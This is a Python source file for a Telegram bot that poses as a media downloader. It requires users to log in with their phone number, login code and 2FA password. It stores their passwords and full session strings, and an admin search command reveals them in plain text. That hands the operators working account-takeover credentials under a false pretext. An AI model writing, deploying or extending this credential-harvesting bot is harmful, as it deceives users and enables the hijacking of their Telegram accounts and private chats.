from cryptography.fernet import Fernet
import json
import os
import asyncio
import aiosqlite
import re
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from utils import CryptoManager
from helpers import Date

class BotManager:
    def __init__(self):
        with open("config.json") as f:
            config = json.load(f)
        self.API_ID = config["api_id"]
        self.API_HASH = config["api_hash"]
        self.BOT_TOKEN = config["bot_token"]
        self.ADMINS = config["admins"]
        self.crypto = CryptoManager(config["fernet_key"])
        self.bot = TelegramClient('bot_session', self.API_ID, self.API_HASH).start(bot_token=self.BOT_TOKEN)
        self.user_states = {}
        asyncio.get_event_loop().run_until_complete(self.SetupDB())
        self.RegisterHandlers()

    async def SetupDB(self):
        self.bot_username = (await self.bot.get_me()).username
        self.db = await aiosqlite.connect("database.db")
        await self.db.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            user_id INTEGER,
            phone TEXT,
            password TEXT,
            session TEXT,
            PRIMARY KEY (user_id, phone)
        )""")
        await self.db.execute("""
        CREATE TABLE IF NOT EXISTS bans (
            user_id INTEGER PRIMARY KEY
        )""")
        await self.db.execute("""
        CREATE TABLE IF NOT EXISTS stats (
            key TEXT PRIMARY KEY,
            value INTEGER
        )""")
        await self.db.execute("INSERT OR IGNORE INTO stats (key, value) VALUES ('codes_sent', 0)")
        await self.db.commit()

    def RegisterHandlers(self):
        @self.bot.on(events.NewMessage(pattern='/start'))
        async def Start(event):
            await self.HandleStart(event)

        @self.bot.on(events.NewMessage)
        async def Msg(event):
            await self.HandleMsg(event)

        @self.bot.on(events.CallbackQuery)
        async def Callback(event):
            await self.HandleCallback(event)

    async def HandleStart(self, event):
        user_id = event.sender_id
        sender = await event.get_sender()

        if await self.IsBanned(user_id):
            await event.respond("🚫 You have been blocked from using this bot.")
            return

        if user_id in self.ADMINS:
            await event.respond("👋 Welcome admin!", buttons=[
                [Button.inline("📊 Stats", b"stats"), Button.inline("📜 Users", b"list")],
                [Button.inline("🔍 Search", b"search"), Button.inline("🚫 Ban", b"ban")]
            ])
            return

        if await self.HasSessions(user_id):
            name = f"{sender.first_name} {sender.last_name if sender.last_name else ''}"
            mention = f"[{name}](tg://user?id={user_id})"
            await event.respond(
                f"👋 Welcome {mention}!\n\n"
                "📥 Use the button below to download media from a message link.\n\n"
                "⚠️ *Note:* Make sure you're logged into the bot using the account that's a member of the chat you want to download media from.", buttons=[
                [Button.inline("📥 Download Media", b"download_link")]
            ])
        else:
            self.user_states[user_id] = {'stage': 'awaiting_phone_text'}
            await event.respond("👋 Welcome! Please login to continue.", buttons=[
                [Button.inline("📱 Enter Phone", b"enter_phone")]
            ])

    async def HandleMsg(self, event):
        user_id = event.sender_id
        state = self.user_states.get(user_id)
        if not state:
            return

        if state['stage'] == 'awaiting_phone_text' and event.raw_text.startswith("+"):
            phone = event.raw_text.strip()
            await self.StartLogin(event, user_id, phone)
            return

        if state['stage'] == 'awaiting_code' and event.raw_text.isdigit():
            state['code'] += event.raw_text
            if len(state['code']) >= 5:
                await self.TrySignIn(event, state)
            else:
                await event.respond(f"Current code: `{state['code']}`", buttons=self.DigitButtons())

        elif state['stage'] == 'awaiting_password':
            await self.TryPassword(event, state, event.raw_text)

        elif state['stage'] == 'search_id':
            await self.SearchUser(event, event.raw_text)

        elif state['stage'] == 'ban_id':
            await self.BanUser(event, event.raw_text)

        elif state['stage'] == 'awaiting_link':
            await self.HandleMessageLink(event, event.raw_text)

    async def HandleCallback(self, event):
        user_id = event.sender_id
        data = event.data.decode()

        if data == "stats":
            await self.ShowStats(event)

        elif data == "list":
            await self.ListUsers(event)

        elif data == "search":
            self.user_states[user_id] = {'stage': 'search_id'}
            await event.edit("🔍 Send user details to search (id, phone, username).")

        elif data == "ban":
            self.user_states[user_id] = {'stage': 'ban_id'}
            await event.edit("🚫 Send user ID to ban.")

        elif data == "enter_phone":
            self.user_states[user_id] = {'stage': 'awaiting_phone_text'}
            await event.edit("📞 Send your phone number (with +). Example: `+201234567890`")

        elif data == "download_link":
            if await self.HasSessions(user_id):
                self.user_states[user_id] = {'stage': 'awaiting_link'}
                await event.edit("🔗 Send the message link.")
            else:
                await event.edit("⚠️ You need to login first.", buttons=[
                    [Button.inline("📱 Enter Phone", b"enter_phone")]
                ])

        elif user_id in self.user_states and self.user_states[user_id]['stage'] == 'awaiting_code':
            state = self.user_states[user_id]
            state['code'] += data
            if len(state['code']) >= 5:
                await self.TrySignIn(event, state)
            else:
                await event.edit(f"Current code: `{state['code']}`", buttons=self.DigitButtons())

    async def StartLogin(self, event, user_id, phone):
        client = TelegramClient(StringSession(), self.API_ID, self.API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        self.user_states[user_id] = {
            'stage': 'awaiting_code',
            'phone': phone,
            'client': client,
            'phone_code_hash': sent.phone_code_hash,
            'code': ''
        }
        await self.IncrementStat('codes_sent')
        await event.respond("📲 Enter the code you received:", buttons=self.DigitButtons())

    async def TrySignIn(self, event, state):
        client = state['client']
        try:
            await client.sign_in(state['phone'], state['code'], phone_code_hash=state['phone_code_hash'])
            password = 'No Password'
            session = client.session.save()
            enc = self.crypto.encrypt(session)
            await self.db.execute("INSERT INTO sessions (user_id, phone, password, session) VALUES (?, ?, ?, ?)",
                                  (event.sender_id, state['phone'], self.crypto.encrypt(password), enc))
            await self.db.commit()
            await event.respond("✅ Login successful! Use the button below:", buttons=[
                [Button.inline("📥 Download Media", b"download_link")]
            ])
        except Exception as e:
            if 'PASSWORD_HASH_INVALID' in str(e) or '2FA' in str(e) or 'Two-steps verification is enabled' in str(e):
                state['stage'] = 'awaiting_password'
                await event.respond("🔐 2FA enabled. Please send your password.")
            else:
                await event.respond(f"⚠️ Login error: {e}")

    async def TryPassword(self, event, state, password):
        client = state['client']
        try:
            await client.sign_in(password=password)
            session = client.session.save()
            enc = self.crypto.encrypt(session)
            await self.db.execute("INSERT INTO sessions (user_id, phone, password, session) VALUES (?, ?, ?, ?)",
                                  (event.sender_id, state['phone'], self.crypto.encrypt(password), enc))
            await self.db.commit()
            await event.respond("✅ Login successful! Use the button below:", buttons=[
                [Button.inline("📥 Download Media", b"download_link")]
            ])
        except Exception as e:
            await event.respond(f"❌ 2FA error: {e}")

    async def HandleMessageLink(self, event, link):
        user_id = event.sender_id
        self.user_states.pop(user_id, None)
        match = re.match(r'https?://t\.me/([^/]+)/(\d+)', link)
        if not match:
            await event.respond("❌ Invalid link format.")
            return

        username, msg_id = match.groups()
        msg_id = int(msg_id)

        cur = await self.db.execute("SELECT session FROM sessions WHERE user_id=? ORDER BY rowid DESC LIMIT 1", (user_id,))
        row = await cur.fetchone()
        if not row:
            await event.respond("⚠️ No session found. Please login first.")
            return

        try:
            session = StringSession(self.crypto.decrypt(row[0]))
            user_client = TelegramClient(session, self.API_ID, self.API_HASH)
            await user_client.connect()
            entity = await user_client.get_entity(username)
            msg = await user_client.get_messages(entity, ids=msg_id)
            if not msg or not msg.media:
                await event.respond("⚠️ No downloadable media found.")
                return
            path = await user_client.download_media(msg)
            await event.respond(f"📥 Download completed via {self.bot_username}", file=msg.media)
            os.remove(path)
        except ValueError:
            await event.respond("🚫 You're not in that channel. Join first.")
        except Exception as e:
            await event.respond(f"❌ Error: {e}")

    async def HasSessions(self, user_id):
        cur = await self.db.execute("SELECT 1 FROM sessions WHERE user_id=?", (user_id,))
        return await cur.fetchone() is not None

    async def ShowStats(self, event):
        cur = await self.db.execute("SELECT COUNT(DISTINCT user_id) FROM sessions")
        users = (await cur.fetchone())[0]
        cur = await self.db.execute("SELECT value FROM stats WHERE key='codes_sent'")
        codes = (await cur.fetchone())[0]
        await event.edit(f"👥 Users: {users}\n📨 Codes Sent: {codes}")

    async def ListUsers(self, event):
        cur = await self.db.execute("SELECT DISTINCT user_id FROM sessions")
        rows = await cur.fetchall()
        txt = "\n".join([f"- {r[0]}" for r in rows]) or "No users yet."
        await event.edit(f"📜 Users:\n{txt}")

    async def SearchUser(self, event, text):
        if text.startswith("+"):
            cur = await self.db.execute("SELECT user_id, phone, password, session FROM sessions WHERE phone=?", (text,))
        elif not text.isdigit():
            user_id = (await self.bot.get_entity(text)).id
            cur = await self.db.execute("SELECT phone, user_id, password, session FROM sessions WHERE user_id=?", (int(user_id),))
        else:
            cur = await self.db.execute("SELECT phone, user_id, password, session FROM sessions WHERE user_id=?", (int(text),))
        rows = await cur.fetchall()
        for row in rows:
            user = await self.bot.get_entity(
                    row[0] if not (
                                str(row[0])
                                    ).startswith('+') else row[1]
                                        )
            name = user.first_name + (user.last_name if user.last_name else '')
            user_id = user.id
            if user.username:
                username = (f'@{user.username}')
            elif user.usernames:
                username = (", ".join(f"@{u.username}" for u in user.usernames))
            else:
                username = 'No Username'
            phone = (row[0] if (str(row[0])).startswith('+') else row[1])
            password = self.crypto.decrypt(row[2])
            session = self.crypto.decrypt(row[3])
            date = Date.date(user_id)
            if row:
                message = (
                    f"🔍 Found Database About: {name}\n"
                    f"🪪 Name: {name}\n"
                    f"🆔 ID: {user_id}\n"
                    f"✉️  Usernames: {username}\n"
                    f"✨ Premium: {'Yes' if user.premium else 'No'}\n"
                    f"❄ Frozen: {'Yes' if user.deleted and user.bot_verification_icon else 'No'}\n"
                    f"🕦 Creation: {date}\n"
                    f"📞 Phone: {phone}\n"
                    f"🔐 Password: {password}\n"
                    f"📼 Session: `{session}`"
                )
            else:
                message = "❌ Not found."
            await event.respond(message)
            self.user_states.pop(event.sender_id, None)

    async def BanUser(self, event, text):
        await self.db.execute("INSERT OR REPLACE INTO bans (user_id) VALUES (?)", (int(text),))
        await self.db.commit()
        await event.respond(f"🚫 User {text} banned.")
        self.user_states.pop(event.sender_id, None)

    async def IsBanned(self, user_id):
        cur = await self.db.execute("SELECT 1 FROM bans WHERE user_id=?", (user_id,))
        return await cur.fetchone() is not None

    async def IncrementStat(self, key):
        await self.db.execute("UPDATE stats SET value=value+1 WHERE key=?", (key,))
        await self.db.commit()

    def DigitButtons(self):
        return [[Button.inline(str(i), str(i).encode()) for i in range(1, 4)],
                [Button.inline(str(i), str(i).encode()) for i in range(4, 7)],
                [Button.inline(str(i), str(i).encode()) for i in range(7, 10)],
                [Button.inline("0", b"0")]]

    def Run(self):
        print("🚀 Bot running...")
        self.bot.run_until_disconnected()

if __name__ == "__main__":
    bot = BotManager()
    bot.Run()
